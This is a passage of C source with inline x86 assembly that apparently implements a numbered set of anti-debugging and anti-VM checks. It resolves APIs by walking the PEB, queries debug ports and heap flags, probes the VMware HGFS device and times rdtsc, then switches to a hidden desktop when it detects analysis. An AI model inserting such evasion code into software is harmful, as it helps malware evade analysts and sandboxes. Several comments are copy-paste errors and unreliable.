		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
			
		get_startup_info_A_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x53746547;       backwards order of bytes Chec 43 68 65 63 //GetS 47 65 74 53
		je get_startup_info_A_loop1
		jmp get_startup_info_A_loop
		get_startup_info_A_loop1 :
		cmp dword ptr[esi + 0xb], 0x416f666e										//nfoA   6e 66 6f 41
		je stopped_get_startup_info_A_loop;
		jmp get_startup_info_A_loop
		stopped_get_startup_info_A_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov get_startup_info_A, eax

		/////////////////////Find GetLastError
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
		
		get_last_error_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x4c746547;       backwards order of bytes Chec 43 68 65 63 //GetL 47 65 74 4c
		je get_last_error_loop1
		jmp get_last_error_loop
		get_last_error_loop1 :
		cmp dword ptr[esi + 0x8], 0x726f7272									//rror   72 72 6f 72
		je stopped_get_last_error_loop;
		jmp get_last_error_loop
		stopped_get_last_error_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov get_last_error, eax
		//////////////////Find GetCommandLineA
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16

		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
	

		get_command_line_A_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x43746547;       backwards order of bytes Chec 43 68 65 63 //GetC 47 65 74 43
		je get_command_line_A_loop1
		jmp get_command_line_A_loop
		get_command_line_A_loop1 :
		cmp dword ptr[esi + 0xb], 0x41656e69									//ineA  69 6e 65 41
		je stopped_get_command_line_A_loop;
		jmp get_command_line_A_loop
		stopped_get_command_line_A_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov get_command_line_A, eax

		/////////////////////Find NtCreateProcess
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
		
		nt_create_process_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x7243744e;       backwards order of bytes Chec 43 68 65 63 //NtCr 4e 74 43 72 
		je nt_create_process_loop1
		jmp nt_create_process_loop
		nt_create_process_loop1 :
		cmp dword ptr[esi + 0xc], 0x00737365									//ess  65 73 73 00
		je stopped_nt_create_process_loop;
		jmp nt_create_process_loop
		stopped_nt_create_process_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov nt_create_process, eax

		//////////////Find CreateMutexA
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
			
		create_mutex_A_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x61657243;       backwards order of bytes Chec 43 68 65 63 //Crea 43 72 65 61
		je create_mutex_A_loop1
		jmp create_mutex_A_loop
		create_mutex_A_loop1 :
		cmp dword ptr[esi + 0x8], 0x41786574									//texA  74 65 78 41
		je stopped_create_mutex_A_loop;
		jmp create_mutex_A_loop
		stopped_create_mutex_A_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov create_mutex_A, eax

		/////////////Find ContinueDebugEvent
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
			
		continue_debug_event_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x746e6f43;       backwards order of bytes Chec 43 68 65 63 //Cont 43 6f 6e 74
		je continue_debug_event_loop1
		jmp continue_debug_event_loop
		continue_debug_event_loop1 :
		cmp dword ptr[esi + 0xe], 0x746e6576									//vent  76 65 6e 74
		je stopped_continue_debug_event_loop;
		jmp continue_debug_event_loop

		stopped_continue_debug_event_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov continue_debug_event, eax
	}
	int start_up_info_struct[sizeof(STARTUPINFO)];
	int process_information_struct[sizeof(PROCESS_INFORMATION)];
	int debug_event_struct[sizeof(DEBUG_EVENT)];


	__asm {
		jmp create_process_loc3
		create_process_loc3_back :
		pop esi
		mov start_up_info_struct, esi

		jmp create_process_loc4
		create_process_loc4_back :
		pop esi
		mov process_information_struct, esi

		jmp create_process_loc5
		create_process_loc5_back :
		pop esi
		mov debug_event_struct, esi
	}

	__asm {
		///////////////Selfdebug
		xor ebx, ebx
		push start_up_info_struct

		call get_startup_info_A
		call get_command_line_A
		push  process_information_struct
		push start_up_info_struct
		push ebx
		push ebx
		push 1; DEBUG_PROCESS
		push ebx
		push ebx
		push ebx
		push eax
		push ebx
		call create_process_A
		mov ebx, debug_event_struct
		jmp create_process_loc2
		create_process_loc1 :
		push 10002h; DBG_CONTINUE
		push dword ptr[esi + 0ch]; dwThreadId
		push dword ptr[esi + 8]; dwProcessId
		call continue_debug_event
		create_process_loc2 :
		push - 1; INFINITE
		push ebx
		call wait_for_debug_event
		cmp byte ptr[ebx], 5
		; EXIT_PROCESS_DEBUG_EVENT
		jne create_process_loc1

		create_process_loc3 : // sizeof(STARTUPINFO)//44h//db 44h dup(? )
		call create_process_loc3_back

			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)

		create_process_loc4:	// sizeof(PROCESS_INFORMATION) //l4: db 10h dup(? )
		call create_process_loc4_back
		
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
		create_process_loc5 : // sizeof(DEBUG_EVENT) //l5: db 60h dup(? )
		call create_process_loc5_back
			
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)
			bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90) bb(0x90)

		jmp	selectors
	}
	

	*/
	//////////Selectors
	
	selectors:
		push 3
		pop gs
		selectors_loc_1 :
		mov ax, gs
		cmp al, 3
		je selectors_loc_1
		push 3
		pop gs
		mov ax, gs
		cmp al, 3
		jne switch_desktop_1
		jmp ntqueryinformation_process
		
	
	
	///////////////////////10.a NtQueryInformationProcess: w/ ProcessDebugPort					[CHECKED]
	
	ntqueryinformation_process:
		mov eax, fs : [30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)

		NtQueryInfrmtionProcess:
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x7551744e;       backwards order of bytes Chec 43 68 65 63 //NtQu 4e745175
		je NtQueryInfrmtionProcess_loop1
		jmp NtQueryInfrmtionProcess
		NtQueryInfrmtionProcess_loop1 :
		cmp dword ptr[esi + 0x14], 0x7365636f										//oces  6f636573
		je stoppedNtQueryInfrmtionProcess;
		jmp NtQueryInfrmtionProcess
		stoppedNtQueryInfrmtionProcess :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of NtQueryInformationProcess
		mov nt_query_information_process, eax

		xor ebx, ebx
		push ebx
		mov ebx, esp
		push 0
		push 4
		push ebx
		push 7; ProcessDebugPort	 //type of information is being requested from the target process:  2nd paramrter ProcessDebugPort (7)
		push - 1                      //instruct the function to use the current process as the target: 1st parameter  __in HANDLE ProcessHandle
		call nt_query_information_process
		pop ebx
		inc ebx
		cmp ebx, 0
		je switch_desktop_1
		jmp object_handle
		//jmp continue_execution
		
		////////////////////////10.b NtQueryInformationProcess: w/ ProcessDebugObjectHandle			[CHECKED]
		object_handle :
		xor ebx, ebx
		push ebx
		mov ebx, esp
		push 0
		push 4
		push ebx
		push 1eh; ProcessDebugObjectHandle	 //type of information is being requested from the target process:  
		push - 1                      //instruct the function to use the current process as the target: 1st parameter  __in HANDLE ProcessHandle
		call nt_query_information_process
		pop ebx
		test ebx, ebx
		jne switch_desktop_1
		jmp process_debug_flags
		////////////////////////10.c NtQueryInformationProcess: w/ ProcessDebugFlags				[CHECKED]
		process_debug_flags :
		xor ebx, ebx
		push ebx
		mov ebx, esp
		push 0
		push 4
		push ebx
		push 1fh; ProcessDebugFlags	 //type of information is being requested from the target process:  
		push - 1                      //instruct the function to use the current process as the target: 1st parameter  __in HANDLE ProcessHandle
		call nt_query_information_process
		pop ebx
		test ebx, ebx
		je switch_desktop_1
		//jmp interrupt
		jmp rtlqueryprocess_debuginformation
	
	/*
	/////////////////////////8.interrupt 0x2d													[CHECKED]
	
	interrupt:
		xor eax, eax
		int 2dh
		inc eax
		je switch_desktop_1
		//jmp rtlqueryprocess_debuginformation
		jmp continue_execution

		*/

	////////////////////RtlQueryProcessDebugInformation

	
	
	rtlqueryprocess_debuginformation:
		//////////////////RtlCreateQueryDebugBuffer
		mov eax, fs : [30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
			
		rtl_query_create_debug_buffer_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x436c7452;       backwards order of bytes Chec 43 68 65 63 //RtlQ 52 74 6c 43
		je rtl_query_create_debug_buffer_loop1
		jmp rtl_query_create_debug_buffer_loop
		rtl_query_create_debug_buffer_loop1 :
		cmp dword ptr[esi + 0x15], 0x72656666										//ffer 66 66 65 72
		je stopped_rtl_query_create_debug_buffer_loop;
		jmp rtl_query_create_debug_buffer_loop
		stopped_rtl_query_create_debug_buffer_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov rtl_query_create_debug_buffer, eax

		/////////////////////////RtlQueryProcessDebugInformation
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)
			
		rtl_query_process_debug_information_loop :
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x516c7452;       backwards order of bytes Chec 43 68 65 63 //RtlQ 52 74 6c 51
		je rtl_query_process_debug_information_loop1
		jmp rtl_query_process_debug_information_loop
		rtl_query_process_debug_information_loop1 :
		cmp dword ptr[esi + 0xe], 0x62654473										//sDeb 73 44 65 62
		je stopped_rtl_query_process_debug_information_loop;
		jmp rtl_query_process_debug_information_loop
		stopped_rtl_query_process_debug_information_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of VirtualFree
		mov rtl_query_process_debug_information, eax

		xor ebx, ebx
		push ebx
		push ebx
		call rtl_query_create_debug_buffer
		push eax
		push 14h; PDI_HEAPS + PDI_HEAP_BLOCKS
		xchg ebx, eax
		push fs : [eax + 20h]; UniqueProcess
		call rtl_query_process_debug_information
		mov eax, [ebx + 38h]; HeapInformation
		mov eax, [eax + 8]; Flags
		bswap eax		; not HEAP_SKIP_VALIDATION_CHECKS
		and al, 0efh	; GROWABLE +TAIL_CHECKING_ENABLED +FREE_CHECKING_ENABLED +VALIDATE_PARAMETERS_ENABLED reversed by bswap
		cmp eax, 62000040h
		je switch_desktop_1
		jmp device_drivers
		//jmp continue_execution

	
	
	///////////Device Drivers \\.\HGFS
	

		device_drivers:
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12
		mov eax, [eax + 0x14]; 20
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16
		mov   ebx, eax;
		mov   eax, [ebx + 0x3c];               get PE header Virtual Memory Address of kernel32
		mov   edi, [ebx + eax + 0x78];		   get Export table relative offset from peheader start 0x78
		add   edi, ebx;						   get Export table directory(Type IMAGE_EXPORT_DIRECTORY) (VA)
		mov   ecx, [edi + 0x18];			   get ExportDirectoryTable Number of name Pointers
		mov   edx, [edi + 0x20];			   get Export Table Names table(RVA)
		add   edx, ebx;						   get Export Table Names table(VA)

		create_file_A_loop:
		dec ecx
		mov esi, [edx + ecx * 4];			  Store the relative offset of the name
		add esi, ebx;					      Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x61657243;       backwards order of bytes Chec 43 68 65 63 //Crea 43 72 65 61
		je create_file_A_loop1
		jmp create_file_A_loop
		create_file_A_loop1 :
		cmp dword ptr[esi + 0x7], 0x41656c69					//ileA  69 6c 65 41
		je stopped_create_file_A_loop;
		jmp create_file_A_loop
		stopped_create_file_A_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA; Eax holds address of OutputDebugStringA
		mov create_file_A, eax

		xor eax, eax
		push eax
		push eax
		push 3; OPEN_EXISTING
		push eax
		push 0x00000004; FILE_SHARE_READ
		push 0x80000000; GENERIC_READ
		jmp device_drivers_loc1
		device_drivers_loc1_back :
		pop esi
		push esi
		call create_file_A
		cmp eax, -1; INVALID_HANDLE_VALUE
		jne switch_desktop_1
		//jmp continue_execution
		jmp rdtstc1
		device_drivers_loc1 : // sizeof(SYSTEM_INFO) db 24h dup(? )
		call device_drivers_loc1_back
			bb(0x5c) bb(0x5c) bb(0x2e) bb(0x5c) bb(0x48) bb(0x47) bb(0x46) bb(0x53) bb(0x00)	; \\.\HGFS

	
	
	
	//////////////////////RDTSTC															[CHECKED]
	
	rdtstc1:
		rdtsc
		xchg esi, eax
		mov edi, edx
		rdtsc
		sub eax, esi
		sbb edx, edi
		jne switch_desktop_1
		cmp eax, 500h
		jnbe switch_desktop_1
		jmp continue_execution
	
	/////////////////////////switchdesktop
	
	
		switch_desktop_1:
		///////////////////
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12    _PEB_LDR_DATA* Ldr
		mov eax, [eax + 0x14]; 20	 LIST_ENTRY    InMemoryOrderModuleList    Pointer to LDR_DATA_TABLE_ENTRY
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16		LIST_ENTRY InInitializationOrderLinks
		mov   ebx, eax; Take the base address of kernel32
		mov   eax, [ebx + 0x3c]; PE header VMA
		mov   edi, [ebx + eax + 0x78]; Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx; Export table VMA
		mov   ecx, [edi + 0x18]; Number of names
		mov   edx, [edi + 0x20]; Names table relative offset   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx; Names table VMA
		//////////////////// LoadLibraryA
		load_library_A_loop :
		dec ecx
		mov esi, [edx + ecx * 4]; Store the relative offset of the name
		add esi, ebx; Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
		je load_library_A_loop_1
		jmp load_library_A_loop;
		load_library_A_loop_1:
		cmp dword ptr[esi + 0x9], 0x00417972;			ryA	72 79 41
		je stopped_load_library_A_loop
		jmp load_library_A_loop;
		stopped_load_library_A_loop:
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA
		mov load_library_A, eax
		////////////////////////////user32.dll
		sub esp, 11
		mov ebx, esp
		mov byte ptr[ebx], 0x75; u
		mov byte ptr[ebx + 1], 0x73; s
		mov byte ptr[ebx + 2], 0x65; e
		mov byte ptr[ebx + 3], 0x72; r
		mov byte ptr[ebx + 4], 0x33; 3
		mov byte ptr[ebx + 5], 0x32; 2
		mov byte ptr[ebx + 6], 0x2e; .
		mov byte ptr[ebx + 7], 0x64; d
		mov byte ptr[ebx + 8], 0x6c; l
		mov byte ptr[ebx + 9], 0x6c; l
		mov byte ptr[ebx + 10], 0x0
		mov eax, [esp + 11]
		push ebx
		//LoadLibraryA with user32.dll as argument
		call load_library_A;
		//add esp, 11
		mov user32_base, eax
		
		///////////////////getprocaddress
		mov eax, fs:[30h]
		mov eax, [eax + 0x0c]; 12    _PEB_LDR_DATA* Ldr
		mov eax, [eax + 0x14]; 20	 LIST_ENTRY    InMemoryOrderModuleList    Pointer to LDR_DATA_TABLE_ENTRY
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]; 16		LIST_ENTRY InInitializationOrderLinks
		mov   ebx, eax; Take the base address of kernel32
		mov   eax, [ebx + 0x3c]; PE header VMA
		mov   edi, [ebx + eax + 0x78]; Export table relative offset  PE + 0x78 (i.e., offset 120 bytes) is the relative address(relative to DLL base address) of the export table
		add   edi, ebx; Export table VMA
		mov   ecx, [edi + 0x18]; Number of names
		mov   edx, [edi + 0x20]; Names table relative offset   DWORD AddressOfNames; //offset 0x20
		add   edx, ebx; Names table VMA
		
		get_proc_address_loop :
		dec ecx
		mov esi, [edx + ecx * 4]; Store the relative offset of the name
		add esi, ebx; Set esi to the VMA of the current name
		cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
		je get_proc_address_loop_1
		jmp get_proc_address_loop
		get_proc_address_loop_1 :
		cmp dword ptr[esi + 0xb], 0x00737365     //ess 65 73 73
		je stopped_get_proc_address_loop
		jmp get_proc_address_loop
		stopped_get_proc_address_loop :
		mov   edx, [edi + 0x24]; Table of ordinals relative
		add   edx, ebx; Table of ordinals
		mov   cx, [edx + 2 * ecx]; function ordinal
		mov   edx, [edi + 0x1c]; Address table relative offset
		add   edx, ebx; Table address
		mov   eax, [edx + 4 * ecx]; ordinal offset
		add   eax, ebx; Function VMA
		mov get_proc_address, eax
		//////////////////////////////////createdesktop
		sub esp, 15
		mov ebx, esp
		mov byte ptr[ebx], 0x43 //C     43 72 65 61 74 65 44 65 73 6b 74 6f 70 41
		mov byte ptr[ebx + 1], 0x72 //r
		mov byte ptr[ebx + 2], 0x65 //e
		mov byte ptr[ebx + 3], 0x61 //a
		mov byte ptr[ebx + 4], 0x74 //t
		mov byte ptr[ebx + 5], 0x65 //e
		mov byte ptr[ebx + 6], 0x44 //D
		mov byte ptr[ebx + 7], 0x65 //e
		mov byte ptr[ebx + 8], 0x73 //s
		mov byte ptr[ebx + 9], 0x6b //k
		mov byte ptr[ebx + 10], 0x74 //t
		mov byte ptr[ebx + 11], 0x6f //o
		mov byte ptr[ebx + 12], 0x70 //p
		mov byte ptr[ebx + 13], 0x41 //A
		mov byte ptr[ebx + 14], 0x0

		mov eax, [esp + 15]
		push ebx
		mov edi, user32_base										
																//lea eax, [user32_base]
		push user32_base; base address of user32.dll retrieved by LoadLibraryA
		mov esi, get_proc_address										/////////esi=getprocaddress
		call get_proc_address; GetProcAddress address : ))
		mov create_desktop_A, eax
		mov edx, eax													////////edx=createdesktop
		////////////////////////////////switchdesktop
		sub esp, 14
		mov ebx, esp
		mov byte ptr[ebx], 0x53 //S     43 72 65 61 74 65 44 65 73 6b 74 6f 70 41
		mov byte ptr[ebx + 1], 0x77 //w
		mov byte ptr[ebx + 2], 0x69 //i
		mov byte ptr[ebx + 3], 0x74 //t
		mov byte ptr[ebx + 4], 0x63 //c
		mov byte ptr[ebx + 5], 0x68 //h
		mov byte ptr[ebx + 6], 0x44 //D
		mov byte ptr[ebx + 7], 0x65 //e
		mov byte ptr[ebx + 8], 0x73 //s
		mov byte ptr[ebx + 9], 0x6b //k
		mov byte ptr[ebx + 10], 0x74 //t
		mov byte ptr[ebx + 11], 0x6f //o
		mov byte ptr[ebx + 12], 0x70 //p
		mov byte ptr[ebx + 13], 0x0

		mov eax, [esp + 14]
		push ebx
		push edi; base address of user32.dll retrieved by LoadLibraryA
		mov eax, esi
		mov esi, edx; esi = create_desktop
		call eax; GetProcAddress address : ))
		mov edi, eax
		/////////////
		xor eax, eax
		push eax
		push 182h; DESKTOP_CREATEWINDOW + DESKTOP_WRITEOBJECTS + DESKTOP_SWITCHDESKTOP
		push eax
		push eax
		push eax
		mov eax, esi
		jmp switch_desktop_loc1
		switch_desktop_loc1_back :
		pop esi
		push esi /////////pudh string my desktop on stack
		call eax /////////call create desktop
		push eax
		mov eax, edi
		call eax /////call switch desktop
		switch_desktop_loc1 :
		call switch_desktop_loc1_back

		bb('m') bb('y') bb('d') bb('e') bb('s')  bb('k')  bb('t')  bb('t')  bb('o')  bb('p')  bb(0x00)
	//}
	//__asm {
	continue_execution:
	mov esp, ebp
	pop ebp
